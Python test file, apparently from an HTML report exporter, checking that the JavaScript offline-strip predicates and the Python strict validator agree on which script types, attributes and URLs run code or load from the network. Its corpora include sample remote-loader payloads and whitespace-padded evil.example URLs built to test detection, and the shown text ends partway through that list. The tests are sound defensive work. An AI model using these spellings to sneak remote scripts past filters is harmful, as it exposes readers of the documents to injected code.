                any(self._is_screen_only_media(prelude) for prelude in media),
                "the scroll-fade mask rule in %s is not inside a screen-only @media block (at-rule "
                "context: %s). Outside one it applies in PRINT too, and a wide diagram prints with "
                "faded left and right edges for a scroll that paper cannot do. Note a media LIST is "
                "a union: every comma branch must name `screen`, or the rule still matches paper."
                % (name, list(media)))
            for prelude in media:
                self.assertNotRegex(
                    prelude, r"(?<![-\w])print(?![-\w])",
                    "the scroll-fade mask rule in %s sits in an at-rule context that names the "
                    "print media type (%r); the cue is for scrolling, which paper does not do."
                    % (name, prelude))
            self.assertTrue(
                [v for v in self._mask_image_values(decls, prefixed=True) if v and v != "none"],
                "the scroll-fade mask rule in %s dropped (or reset to `none`) its "
                "`-webkit-mask-image` declaration. The reports are standalone HTML opened in "
                "arbitrary browsers, and no assertion in this Chromium-only suite can catch it "
                "(Chromium aliases the two properties), so the pair is pinned here." % name)
            # An attribute-selector VALUE is not a faded host: `[data-x="div.mermaid.cmh-diagram-
            # scroll-fade"]` would otherwise satisfy the vocabulary check while the real rule faded
            # nothing - the same "text near the rule stands in for the rule" hole the comment
            # stripping closes. A blanked `[]` BETWEEN the host and the class is fine, though
            # (`div.mermaid[data-x].cmh-diagram-scroll-fade` still fades that host).
            cleaned = re.sub(r"\[[^\]]*\]", "[]", selector)
            hosts |= set(re.findall(
                r"([A-Za-z][\w-]*\.[\w-]+)(?:\[\])*\.cmh-diagram-scroll-fade(?![-\w])", cleaned))
        self.assertEqual(
            hosts, set(self._mermaid_hosts()),
            "the scroll-fade mask rules and the shared CMH_MERMAID_SEL vocabulary have diverged "
            "(faded hosts: %s; declared: %s). A declared host with no fade loses the scroll cue; a "
            "faded host that is no longer declared is dead CSS. Note this reads flat "
            "`<element>.<class>` arms (the shape `_mermaid_hosts` pins); teach it if the selector "
            "grammar changed to `:is(...)` or similar."
            % (sorted(hosts), sorted(self._mermaid_hosts())))

    def test_every_runtime_selector_is_recognised_by_the_author_time_detector(self):
        markup = {
            "pre.mermaid": '<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>',
            "div.mermaid": '<div class="mermaid">graph TD; A--&gt;B;</div>',
            "figure.chart canvas": '<figure class="chart"><canvas id="a"></canvas></figure>',
            "canvas.cmh-chart": '<canvas class="cmh-chart" id="b"></canvas>',
            "canvas[data-cmh-chart-points]": '<canvas id="c" data-cmh-chart-points="[]"></canvas>',
            "canvas[data-cmh-chart-source]": '<canvas id="d" data-cmh-chart-source="pts"></canvas>',
        }
        self.assertEqual(set(markup), set(vendored_libs.RUNTIME_SELECTORS),
                         "add example markup for every declared runtime selector")
        for selector, fragment in markup.items():
            self.assertTrue(
                vendored_libs.content_needs_rich_libs(_doc("<h1>H</h1>\n" + fragment)),
                "content matching the runtime selector %r must be detected as needing the "
                "libraries" % selector)


    def test_the_python_and_js_runnable_script_type_predicates_agree(self):
        """The offline strips (JS) and the strict validator (Python) must call the SAME script
        types executable.

        They are two independent implementations of the HTML "JavaScript MIME type" set, and a
        drift between them is invisible: the validator would declare an offline file clean while
        the exporter's strips no longer protect it (or the reverse, so the gate rejects a file the
        exporter just produced). That is not hypothetical - the validator's set was the narrow
        five-type one for as long as the strips' was, so `<script type="text/x-javascript">
        import("https://evil/")</script>` passed `validate.py --strict` as offline-clean.

        Two-directional: the corpus mixes every accepted type with inert and near-miss ones
        (`text/javascript1.6` is deliberately NOT a JavaScript MIME type), so this fails whether an
        implementation drops a type or gains one the other does not have.
        """
        source = self._read("68-export-offline.js")
        body = self._runtime_fn(source, "_offlineIsRunnableScriptType")
        # A structural guard beside the behavioural one below: the trim must stay the literal HTML
        # ASCII class. `trim()` would pass most of the corpus and diverge only on the exotic
        # spellings, so naming it here says WHY the literal is there to the next reader.
        self.assertIn("[\\t\\n\\f\\r ]+", body,
                      "the runtime predicate no longer trims the literal HTML ASCII whitespace "
                      "class; `trim()` also takes NBSP and U+FEFF, which Python's str.strip() does "
                      "not, and this predicate decides whether a script's `src` is a load")
        self.assertNotIn(".trim()", body,
                         "the runtime predicate is back on `trim()`, whose whitespace class "
                         "differs from Python's in both directions")

        # The accepted list is written out LITERALLY rather than derived from `_JS_TYPES`: a corpus
        # built from the set under test shrinks with it, so removing a type would silently remove
        # its own coverage and the check would pass. Unioning `_JS_TYPES` on top covers the other
        # direction (a type ADDED to only one implementation).
        accepted = {"", "module", "text/javascript", "application/javascript",
                    "text/x-javascript", "application/x-javascript",
                    "text/ecmascript", "application/ecmascript",
                    "text/x-ecmascript", "application/x-ecmascript",
                    "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
                    "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
                    "text/jscript", "text/livescript"}
        corpus = sorted(accepted | set(parsing._JS_TYPES) | {
            # inert: data or transpiler-only, must NOT count as executable on either side
            "text/plain", "application/json", "application/ld+json", "importmap",
            "speculationrules", "text/template", "text/babel", "text/jsx",
            "text/x-handlebars-template", "text/vbscript",
            # near misses and normalization
            "text/javascript1.6", "text/javascript1.", "text/ecmascript6", "javascript",
            "  TEXT/JavaScript  ", "text/javascript; charset=utf-8", "module; x=1",
            # The WHITESPACE class, which the two engines' defaults disagree about in BOTH
            # directions: JS `trim()` also takes NBSP and U+FEFF, Python's `str.strip()` also takes
            # U+001C-U+001F and U+0085. A browser trims HTML ASCII whitespace only, so every one of
            # these is a DATA BLOCK, and a divergence here is a document one side calls a loader and
            # the other blesses - which, since this predicate decides whether a `src` is a load
            # (#1144), is an element the export deletes after the gate has passed it.
            "\ufefftext/javascript", "text/javascript\ufeff",
            "\u001ctext/javascript", "text/javascript\u001f",
            "\u00a0text/javascript", "text/javascript\u0085",
            "\u2028text/javascript", "\u3000text/javascript",
            # ...and the ASCII class itself, which both sides MUST trim.
            "\ttext/javascript", "text/javascript\n", "\f\rtext/javascript ",
        })
        for raw in accepted:
            self.assertTrue(parsing._is_executable_js({"type": raw}),
                            "the validator predicate no longer runs %r, which the HTML JavaScript "
                            "MIME type set says a browser executes" % raw)
        self.assertEqual(
            accepted, set(parsing._JS_TYPES),
            "the literal accepted-type list in this test and the validator's _JS_TYPES have "
            "diverged. Both are deliberate spellings of the HTML JavaScript MIME type set; move "
            "them together, or the corpus silently stops covering whatever was dropped.")

        # The REAL runtime function is evaluated in node rather than re-implemented here. A Python
        # re-implementation of the normalization is what let the trim classes above diverge
        # unnoticed: it could only ever prove what PYTHON does with the extracted regexes, and the
        # step it re-implemented (`.trim()` vs `str.strip()`) was exactly the one that differed.
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        script = (
            self._runtime_fn(source, "_offlineIsJsTypeEssence") + "\n"
            + self._runtime_fn(source, "_offlineIsRunnableScriptType") + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify(p.map(_offlineIsRunnableScriptType)));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(corpus),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the runnable-type predicate: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(corpus),
                         "node returned %d verdicts for %d samples" % (len(verdicts), len(corpus)))
        for raw, got in zip(corpus, verdicts):
            self.assertEqual(
                got, parsing._is_executable_js({"type": raw}),
                "the REAL JS engine's _offlineIsRunnableScriptType and the validator's "
                "_is_executable_js disagree about %r. Update BOTH: a type only one of them runs is "
                "either an unstripped executable script the gate blesses, or a false rejection - "
                "and since this predicate decides whether a `src` is a load, a disagreement is an "
                "element the export deletes after the gate has already passed it." % raw)


    # The shared shape corpus for the two element-level parity tests below. Written out LITERALLY
    # rather than derived from either implementation: a corpus built from the code under test
    # shrinks with it, so a dropped rule would silently drop its own coverage.
    _HTML_NS = "http://www.w3.org/1999/xhtml"
    _SVG_NS = "http://www.w3.org/2000/svg"
    _MATHML_NS = "http://www.w3.org/1998/Math/MathML"

    _SCRIPT_ATTR_SETS = [
        # The essence match itself, and the near misses around it.
        {}, {"type": ""}, {"type": "module"}, {"type": "text/javascript"},
        {"type": "application/ecmascript"}, {"type": "text/x-javascript"},
        {"type": "text/javascript1.5"}, {"type": "text/javascript1.6"},
        {"type": "text/jscript"}, {"type": "text/livescript"},
        {"type": "application/json"}, {"type": "importmap"}, {"type": "speculationrules"},
        {"type": "text/babel"}, {"type": "javascript"},
        # ASCII case folding, which must NOT reach past ASCII.
        {"type": "TEXT/JavaScript"}, {"type": "Text/EcmaScript"},
        {"type": "TEXT/JAVASCR\u0130PT"},
        # The MIME PARAMETER: a whole-string essence match, so every one of these is inert.
        {"type": "text/javascript; charset=utf-8"},
        {"type": "text/javascript;charset=utf-8"}, {"type": "module; x=1"},
        {"type": "text/javascript ;"}, {"type": ";text/javascript"},
        # Whitespace. The two engines' defaults disagree in BOTH directions, so the literal
        # HTML ASCII class is the only spelling that keeps the pair honest - and `type=" "` is
        # NOT the empty-string classic branch, because the algorithm tests the RAW value first.
        {"type": " "}, {"type": "\t"}, {"type": "\ttext/javascript "},
        {"type": "\ufefftext/javascript"}, {"type": "text/javascript\ufeff"},
        {"type": "\u001ctext/javascript"}, {"type": "text/javascript\u001f"},
        {"type": "\u00a0text/javascript"}, {"type": "text/javascript\u0085"},
        {"type": "\u2028text/javascript"}, {"type": "\u3000text/javascript"},
        # The `language` fallback, which applies ONLY with no `type` at all and is NOT trimmed.
        {"language": "javascript"}, {"language": "JavaScript"}, {"language": "vbscript"},
        {"language": ""}, {"language": " javascript"}, {"language": "javascript1.5"},
        {"type": "application/json", "language": "javascript"},
        {"type": "", "language": "vbscript"},
        # `nomodule`, on the classic branch only.
        {"nomodule": ""}, {"type": "text/javascript", "nomodule": ""},
        {"type": "module", "nomodule": ""}, {"type": "application/json", "nomodule": ""},
        {"language": "javascript", "nomodule": ""},
        # The legacy `event` + `for` pair: both present, and only the one spelling executes.
        {"event": "onload", "for": "window"}, {"event": "y", "for": "x"},
        {"event": "ONLOAD()", "for": " WINDOW "}, {"event": "onload()", "for": "window"},
        {"event": "onload", "for": "\u00a0window"}, {"event": "onload"}, {"for": "window"},
        {"type": "text/javascript", "event": "y", "for": "x"},
        {"type": "module", "event": "y", "for": "x"},
    ]

    def _script_shape_corpus(self):
        """Every attribute set above, in every namespace a `<script>` can be inserted into."""
        return [{"ns": ns, "attrs": attrs}
                for ns in (self._HTML_NS, self._SVG_NS, self._MATHML_NS, None)
                for attrs in self._SCRIPT_ATTR_SETS]

    def _assert_corpus_covers_every_shape_class(self, corpus):
        """Each residual class is pinned by NAME, so deleting its rows fails here.

        `assertIn(True/False, expected)` alone only catches a corpus that degenerated to one
        verdict; a corpus that lost every `nomodule` row (say) would still carry both verdicts and
        pass while no longer exercising the shape #1171 exists for.
        """
        seen = [(spec["ns"], tuple(sorted(spec["attrs"].items()))) for spec in corpus]
        def present(pred):
            return any(pred(ns, dict(attrs)) for ns, attrs in seen)
        for label, pred in (
                ("a MIME-parameter type", lambda ns, a: ";" in (a.get("type") or "")),
                ("a whitespace-only type", lambda ns, a: (a.get("type") or "x").strip(" \t\n\f\r") == ""
                                                         and a.get("type") != ""),
                ("nomodule on a classic script",
                 lambda ns, a: "nomodule" in a and a.get("type") != "module"),
                ("nomodule on a module script",
                 lambda ns, a: "nomodule" in a and a.get("type") == "module"),
                ("a non-JavaScript language fallback",
                 lambda ns, a: a.get("language") == "vbscript" and "type" not in a),
                ("a JavaScript language fallback",
                 lambda ns, a: a.get("language") == "javascript" and "type" not in a),
                ("the legacy event+for pair, skipped spelling",
                 lambda ns, a: a.get("event") == "y" and a.get("for") == "x"),
                ("the legacy event+for pair, honoured spelling",
                 lambda ns, a: a.get("for") == "window" and a.get("event") == "onload"),
                ("an SVG-namespace row", lambda ns, a: ns == self._SVG_NS),
                ("a MathML-namespace row", lambda ns, a: ns == self._MATHML_NS),
                ("a null-namespace row", lambda ns, a: ns is None),
                # These two classes are why the trim and the fold are spelled out literally rather
                # than left to `trim()` / `toLowerCase()`, so losing them would quietly retire the
                # only corpus evidence that the two engines' defaults disagree.
                ("a non-ASCII-whitespace type",
                 lambda ns, a: any(c in (a.get("type") or "")
                                   for c in "\ufeff\u00a0\u2028\u3000\u001c\u001f\u0085")),
                ("a mixed-case type",
                 lambda ns, a: (a.get("type") or "").lower() != (a.get("type") or "")
                               and ";" not in (a.get("type") or ""))):
            self.assertTrue(present(pred),
                            "the shape corpus no longer covers %s, so the parity test would pass "
                            "while that class drifts unchecked" % label)

    def _run_predicate_in_node(self, fns, call, corpus, label):
        """Evaluate one REAL runtime predicate in node over the corpus, as a stub element.

        The stub exposes only the three DOM members the predicates read. A Python
        re-implementation could only ever prove what Python does with the extracted source, which
        is not the question these tests ask.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        script = (
            fns + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify(p.map(function(spec){"
            "const has=function(n){return Object.prototype.hasOwnProperty.call(spec.attrs,n);};"
            "const el={namespaceURI:spec.ns,"
            "getAttribute:function(n){return has(n)?spec.attrs[n]:null;},"
            "hasAttribute:has};"
            "return " + call + ";})));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(corpus),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate %s: %s" % (label, proc.stderr))
        verdicts = json.loads(proc.stdout)
        self.assertEqual(len(verdicts), len(corpus),
                         "node returned %d verdicts for %d samples" % (len(verdicts), len(corpus)))
        return verdicts

    def _script_predicate_sources(self, *names):
        """The runtime helpers the element-level predicates need, as one JS region."""
        source = self._read("68-export-offline.js")
        fns = "\n".join(
            [self._runtime_string_const(source, "_OFFLINE_HTML_NS"),
             self._runtime_string_const(source, "_OFFLINE_SVG_NS")]
            + [self._runtime_fn(source, name) for name in
               ("_offlineIsJsTypeEssence", "_offlineAsciiLower", "_offlineTrimHtmlWs",
                "_offlineScriptBlockType") + names])
        self.assertNotIn(".toLowerCase()", fns,
                         "an element-level predicate is on Unicode `toLowerCase()`, whose fold "
                         "differs from the validator's ASCII-only `_ascii_lower`")
        self.assertNotIn(".trim()", fns,
                         "an element-level predicate is on `trim()`, whose whitespace class "
                         "differs from HTML's in both directions")
        return fns

    def test_the_python_and_js_script_runs_inline_body_predicates_agree(self):
        """The two INLINE-BODY predicates - `script_runs_inline_body` and
        `_offlineScriptRunsInlineBody` - must agree about whose child text a browser runs.

        This is the question every pass that acts on what a script's BODY says has to ask, and
        `script_code_runs` alone answers it wrongly in two ways. The insertion NAMESPACE must be one
        that defines `script` AND runs it: a MathML `<script>` is an inert unknown element, measured
        not to run. That is not a theoretical difference - the chart HOIST moves a matching element
        into `<body>`, and a MathML script that ran nowhere in the source really does run once
        hoisted and reparsed as HTML, so asking the wrong predicate makes the EXPORT grant execution
        the source never had. And an element with an external source never runs its own child text,
        so deleting one over what its inert body says costs an author a loader that works.

        The corpus is the shared shape corpus crossed with the load attributes, in every namespace,
        so the two sides cannot drift on either rule.
        """
        fns = self._script_predicate_sources("_offlineScriptCodeRuns",
                                             "_offlineScriptRunsInlineBody")
        base = self._script_shape_corpus()
        corpus = []
        for spec in base:
            corpus.append(spec)
            for attr in ("src", "href", "xlink:href"):
                loaded = dict(spec["attrs"])
                loaded[attr] = "x.js"
                corpus.append({"ns": spec["ns"], "attrs": loaded})
                empty = dict(spec["attrs"])
                empty[attr] = ""
                corpus.append({"ns": spec["ns"], "attrs": empty})
        self._assert_corpus_covers_every_shape_class(corpus)
        ns_name = {self._HTML_NS: "html", self._SVG_NS: "svg", self._MATHML_NS: "mathml",
                   None: "html"}
        expected = [parsing.script_runs_inline_body(spec["attrs"], ns_name[spec["ns"]])
                    for spec in corpus]
        self.assertIn(True, expected)
        self.assertIn(False, expected)
        # The two rules this predicate adds over `script_code_runs`, pinned by value.
        self.assertTrue(parsing.script_code_runs({"type": "text/javascript"}, "mathml"))
        self.assertFalse(parsing.script_runs_inline_body({"type": "text/javascript"}, "mathml"))
        self.assertTrue(parsing.script_runs_inline_body({"type": "text/javascript"}, "html"))
        self.assertFalse(
            parsing.script_runs_inline_body({"type": "text/javascript", "src": "x.js"}, "html"))
        self.assertTrue(parsing.script_runs_inline_body({"type": "text/javascript", "src": "x.js"},
                                                        "svg"))
        self.assertFalse(parsing.script_runs_inline_body({"href": "x.js"}, "svg"))

        verdicts = self._run_predicate_in_node(
            fns, "_offlineScriptRunsInlineBody(el)", corpus, "the inline-body predicate")
        for spec, want, got in zip(corpus, expected, verdicts):
            self.assertEqual(
                got, want,
                "the REAL JS engine's _offlineScriptRunsInlineBody and the validator's "
                "script_runs_inline_body disagree about ns=%r attrs=%r (JS says %r, Python says "
                "%r). Update BOTH: this predicate decides whether a pass may DELETE or MOVE an "
                "element on what its body says, and moving one whose body does not run where it is "
                "can START it running in the export."
                % (spec["ns"], spec["attrs"], got, want))

    def test_the_python_and_js_script_code_runs_predicates_agree(self):
        """The two EXECUTION predicates - `script_code_runs` and `_offlineScriptCodeRuns` - must
        call the same `<script>` ELEMENTS runnable.

        The type-only sibling above pins the deliberately over-inclusive predicate, which is still
        the right one for a caller that only SCANS an inline body. This one pins the exact pair:
        HTML's "prepare the script element" reduced to what a static reader can answer. It is what
        every caller that DELETES or MOVES an element on a body decision asks (issue #1171), so a
        drift between them is the CMH-OFFLINE-04 failure in its most expensive form - the gate
        blesses a document and the export then removes an element out of it.

        The corpus is ATTRIBUTE SETS, not type strings, because that is what the residual was: a
        MIME PARAMETER, `nomodule`, the legacy `event`+`for` pair, a whitespace-only `type` and the
        `language` fallback are each decided by something other than the type essence, and four of
        the five cannot be expressed as a type at all. Every NAMESPACE is covered too, since
        `nomodule`, `event`/`for` and `language` are HTMLScriptElement rules an SVG script does not
        obey - measured, not assumed: an SVG `<script nomodule>` with an inline body really does run
        in Chromium, so reading `nomodule` there would call a script that works inert.
        """
        fns = self._script_predicate_sources("_offlineScriptCodeRuns")
        # Structural guards beside the behavioural one: each names a rule whose absence would make
        # the predicate silently broader again, and most of the corpus would still pass.
        for needle, why in (
                ("[\\t\\n\\f\\r ]+", "the ASCII whitespace class the trim must use"),
                ("nomodule", "the classic-branch nomodule skip"),
                ("language", "the language fallback for an absent type"),
                ("event", "the legacy event+for pair"),
                ("namespaceURI", "the HTML-only scoping of those three rules")):
            self.assertIn(needle, fns,
                          "the runtime's element-level runs predicate no longer mentions %s; "
                          "without it the exporter deletes scripts a browser never runs" % why)

        corpus = self._script_shape_corpus()
        self._assert_corpus_covers_every_shape_class(corpus)
        expected = [parsing.script_code_runs(
            spec["attrs"], "html" if spec["ns"] in (self._HTML_NS, None) else "svg")
            for spec in corpus]
        self.assertIn(True, expected)
        self.assertIn(False, expected)
        # The residual classes, pinned by VALUE as well as by presence, so a rule silently dropped
        # from BOTH sides still fails here.
        self.assertFalse(parsing.script_code_runs({"type": "text/javascript; charset=utf-8"}, "html"))
        self.assertFalse(parsing.script_code_runs({"type": " "}, "html"))
        self.assertFalse(parsing.script_code_runs({"type": "text/javascript", "nomodule": ""}, "html"))
        self.assertFalse(parsing.script_code_runs({"language": "vbscript"}, "html"))
        self.assertFalse(parsing.script_code_runs({"event": "y", "for": "x"}, "html"))
        self.assertTrue(parsing.script_code_runs({"type": "text/javascript"}, "html"))
        self.assertTrue(parsing.script_code_runs({"type": "module", "nomodule": ""}, "html"))
        self.assertTrue(parsing.script_code_runs({"event": "onload", "for": "window"}, "html"))
        # The namespace flip: `nomodule` is an HTMLScriptElement rule, so the same element runs in
        # SVG and does not in HTML.
        self.assertTrue(parsing.script_code_runs({"nomodule": ""}, "svg"))

        verdicts = self._run_predicate_in_node(
            fns, "_offlineScriptCodeRuns(el)", corpus, "the element-level runs predicate")
        for spec, want, got in zip(corpus, expected, verdicts):
            self.assertEqual(
                got, want,
                "the REAL JS engine's _offlineScriptCodeRuns and the validator's script_code_runs "
                "disagree about ns=%r attrs=%r (JS says %r, Python says %r). Update BOTH: this "
                "predicate decides whether a pass that DELETES or MOVES an element acts, so a "
                "disagreement is an element the export removes after the gate has already blessed "
                "it." % (spec["ns"], spec["attrs"], got, want))

    def test_the_python_and_js_script_src_fetches_predicates_agree(self):
        """The two FETCH predicates - `script_src_fetches` and `_offlineScriptSrcIsFetched` - must
        call the same `<script src>` a real request.

        This is the pair the shipping CALLERS use, and it is deliberately NOT the execution pair
        above (issue #1171): the request is issued by Chromium's speculative PRELOAD SCANNER, which
        reads the tag soup ahead of the parser, so it ignores the legacy `event`+`for` pair (that
        script is requested and then never runs) and it is namespace-BLIND in both directions. Both
        of those were MEASURED, and the browser fact itself is re-measured by the
        `CMH-VAL-08: a browser requests exactly the script shapes the gate calls a load` spec.

        Comparing the CALLERS, not just the predicates, is the point: the gate has no namespace to
        pass, so `expected` here is computed exactly as the gate computes it - with no `ns` at all -
        while the JS side is handed the real namespace the exporter sees. An earlier revision
        compared the predicates with matching namespaces and stayed green while the two shipping
        callers disagreed about `<svg><script nomodule src>`.
        """
        fns = self._script_predicate_sources("_offlineScriptSrcIsFetched")
        self.assertNotIn("namespaceURI", self._runtime_fn(
            self._read("68-export-offline.js"), "_offlineScriptSrcIsFetched"),
            "the runtime's fetch predicate reads the namespace, but the request is issued by the "
            "namespace-blind preload scanner and the validator's `script_src_fetches` takes no "
            "namespace at all - reading one here re-opens the gate/strip divergence")

        corpus = self._script_shape_corpus()
        self._assert_corpus_covers_every_shape_class(corpus)
        # No namespace: this is exactly what the gate's `src` arm computes for the same element.
        expected = [parsing.script_src_fetches(spec["attrs"]) for spec in corpus]
        self.assertIn(True, expected)
        self.assertIn(False, expected)
        # The measured facts, pinned by value. The first two are where this predicate and the
        # execution one deliberately part company.
        self.assertTrue(parsing.script_src_fetches({"event": "y", "for": "x"}))
        self.assertTrue(parsing.script_src_fetches(
            {"type": "text/javascript", "event": "y", "for": "x"}))
        self.assertTrue(parsing.script_src_fetches({}))
        self.assertTrue(parsing.script_src_fetches({"type": "module", "nomodule": ""}))
        self.assertTrue(parsing.script_src_fetches({"language": "javascript"}))
        self.assertFalse(parsing.script_src_fetches({"type": "text/javascript; charset=utf-8"}))
        self.assertFalse(parsing.script_src_fetches({"type": " "}))
        self.assertFalse(parsing.script_src_fetches({"type": "text/javascript", "nomodule": ""}))
        self.assertFalse(parsing.script_src_fetches({"nomodule": ""}))
        self.assertFalse(parsing.script_src_fetches({"language": "vbscript"}))
        self.assertFalse(parsing.script_src_fetches({"type": "application/json"}))

        verdicts = self._run_predicate_in_node(
            fns, "_offlineScriptSrcIsFetched(el)", corpus, "the src-fetch predicate")
        for spec, want, got in zip(corpus, expected, verdicts):
            self.assertEqual(
                got, want,
                "the REAL JS engine's _offlineScriptSrcIsFetched and the validator's "
                "script_src_fetches disagree about ns=%r attrs=%r (JS says %r, Python says %r). "
                "Update BOTH: this predicate decides whether the gate reports a network load AND "
                "whether the offline strip removes the element, so a disagreement is either a live "
                "network reference left in a file that promises zero network, or an element the "
                "export deletes after the gate has already blessed it."
                % (spec["ns"], spec["attrs"], got, want))


    def test_the_python_and_js_script_load_attributes_agree(self):
        """The offline strip (JS) and the strict validator (Python) must call the SAME attributes a
        script LOAD.

        They are two independent spellings of the set, and a drift between them is the CMH-OFFLINE-04
        failure mode itself: the validator would bless an offline file the strip no longer protects
        (which is exactly how an SVG `<script href>` shipped in a zero-network document), or reject
        one the exporter just produced. The literal control below is written out rather than derived
        from either side, so dropping an attribute from BOTH cannot quietly delete its own coverage.
        """
        source = self._read("68-export-offline.js")
        m = re.search(r"const _OFFLINE_SCRIPT_LOAD_ATTRS = \[([^\]]*)\];", source)
        self.assertIsNotNone(m, "the runtime no longer declares _OFFLINE_SCRIPT_LOAD_ATTRS; the "
                                "parity check is stale and must be re-pointed at whatever replaced it")
        runtime_attrs = tuple(re.findall(r'"([^"]+)"', m.group(1)))
        self.assertEqual(runtime_attrs, ("src", "href", "xlink:href"),
                         "the runtime's script-load attribute set changed. An SVG <script> loads "
                         "through `href`/`xlink:href` and an HTML one through `src`; update this "
                         "literal control and the validator's SCRIPT_LOAD_ATTRS together.")
        self.assertEqual(runtime_attrs, tuple(resources.SCRIPT_LOAD_ATTRS),
                         "the runtime's _OFFLINE_SCRIPT_LOAD_ATTRS and the validator's "
                         "SCRIPT_LOAD_ATTRS have diverged: %r vs %r. An attribute only one of them "
                         "reads is either an unstripped remote loader the gate blesses, or an "
                         "exported file its own --strict run rejects."
                         % (runtime_attrs, tuple(resources.SCRIPT_LOAD_ATTRS)))

    def test_the_offline_strip_leaves_an_active_data_blocks_src_for_the_active_data_pass(self):
        """`_offlineStripScriptLoad` must not clear an active-data block's `src`.

        `_offlineActiveDataBlockIsRemovable` decides an import map by `hasAttribute("src")`, and the
        strip runs FIRST over every script, so clearing the attribute there hides it from the pass
        that owns the block: an import map the SOURCE browser IGNORED (its `src` step fires an error
        and returns) would be kept, and the export would carry it LIVE. An exporter must never add
        behavior the source did not have, and the Python gate - which reads the ORIGINAL attributes -
        rejects that same document, so the two would disagree about the same bytes (CMH-OFFLINE-04).
        """
        source = self._read("68-export-offline.js")
        body = self._runtime_fn(source, "_offlineStripScriptLoad")
        self.assertIn("_offlineActiveDataScriptType", body,
                      "_offlineStripScriptLoad no longer consults the active-data type before "
                      "clearing a src, so an import map that carries one can survive the export "
                      "as a LIVE map the source browser ignored")
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        # The URL predicate is STUBBED rather than extracted: this test pins the TYPE branching, and
        # `_OFFLINE_NETWORK_URL_RE` is assembled from four further constants whose extraction would
        # add breakage that says nothing about the branch under test. The network-URL predicate has
        # its own cross-engine parity test over its own corpus.
        region = "\n".join([
            self._runtime_const(source, "_OFFLINE_ACTIVE_DATA_TYPES"),
            self._runtime_string_const(source, "_OFFLINE_HTML_NS"),
            self._runtime_fn(source, "_offlineActiveDataScriptType"),
            self._runtime_fn(source, "_offlineIsJsTypeEssence"),
            self._runtime_fn(source, "_offlineIsRunnableScriptType"),
            self._runtime_fn(source, "_offlineAsciiLower"),
            self._runtime_fn(source, "_offlineTrimHtmlWs"),
            self._runtime_fn(source, "_offlineScriptBlockType"),
            self._runtime_fn(source, "_offlineScriptCodeRuns"),
            self._runtime_fn(source, "_offlineScriptSrcIsFetched"),
            self._runtime_fn(source, "_offlineScriptSrcFetches"),
            'const _offlineIsNetworkUrl = (v) => /^https?:\\/\\//i.test(v || "");',
            body,
        ])
        script = (
            region + "\n"
            + "const mk=(t)=>{const a={type:t,src:'https://evil.example/x.json'};"
            "return {removed:false,getAttribute:(n)=>(n in a?a[n]:null),"
            "hasAttribute:(n)=>(n in a),removeAttribute:(n)=>{delete a[n];},"
            "remove(){this.removed=true;},attrs:a};};"
            "const out={};['importmap','speculationrules','application/json','text/javascript']"
            ".forEach((t)=>{const s=mk(t);const gone=_offlineStripScriptLoad(s);"
            "out[t]={removedElement:gone||s.removed,keptSrc:'src' in s.attrs};});"
            # A block the export itself neutralized: its type now READS as a data block, but it was
            # runnable as authored, so the strip must still take the whole element.
            "const n=mk('application/json');const nGone=_offlineStripScriptLoad(n,new Set([n]));"
            "out.neutralized={removedElement:nGone||n.removed,keptSrc:'src' in n.attrs};"
            "process.stdout.write(JSON.stringify(out));"
        )
        proc = subprocess.run([node, "-e", script], capture_output=True, text=True,
                              encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the script-load strip: %s" % proc.stderr)
        got = json.loads(proc.stdout)
        for stype in ("importmap", "speculationrules"):
            self.assertFalse(got[stype]["removedElement"],
                             "the strip now deletes a %r element itself; the active-data pass owns "
                             "that decision" % stype)
            self.assertTrue(got[stype]["keptSrc"],
                            "the strip cleared a %r block's src, hiding it from the active-data "
                            "pass that judges the block by it" % stype)
        self.assertFalse(got["application/json"]["removedElement"],
                         "an inert data block's element must survive")
        self.assertFalse(got["application/json"]["keptSrc"],
                         "an inert data block's dead src must be removed")
        self.assertTrue(got["text/javascript"]["removedElement"],
                        "a script a browser runs must lose the whole element")
        self.assertTrue(got["neutralized"]["removedElement"],
                        "a block THIS export neutralized was runnable as authored, so its network "
                        "src is a real load and the element must go - a decoy that borrowed a "
                        "reserved layer id must not earn the data-block treatment from a type the "
                        "export itself just rewrote")

    # A browser removes leading C0 controls and spaces (U+0000-U+0020) before it parses a URL, so a
    # value padded with those still loads while one padded with NBSP or U+FEFF does not resolve as a
    # URL at all. Both engines must draw that line in the same place: JS `\s` excludes U+001C-U+001F
    # but includes U+FEFF, Python's includes the former and not the latter, and Python's
    # `re.IGNORECASE` folds `s` onto U+017F where JS never does.
    # Each case carries its EXPECTED verdict rather than only being compared across the two
    # engines: two implementations that under-detect the same spelling agree perfectly, which is
    # how the browser-normalized spellings below (#923) sat unnoticed in both for so long.
    _NETWORK_URL_CORPUS = [
        ("https://evil.example/x.js", True), ("HTTPS://EVIL.EXAMPLE/x.js", True),
        ("http://evil.example/x.js", True), ("//evil.example/x.js", True),
        (" https://evil.example/x.js", True), ("\thttps://evil.example/x.js", True),
        ("\n//evil.example/x.js", True), ("\r\n//evil.example/x.js", True),
        ("\f//evil.example/x.js", True), ("\u000b//evil.example/x.js", True),
        ("\u0000//evil.example/x.js", True), ("\u001c//evil.example/x.js", True),
        ("\u001d//evil.example/x.js", True), ("\u001e//evil.example/x.js", True),
        ("\u001f//evil.example/x.js", True), ("\u000e//evil.example/x.js", True),
        ("\u001f  \t https://evil.example/x.js", True),
        # padding a browser does NOT strip: the value is a relative reference, not a network load
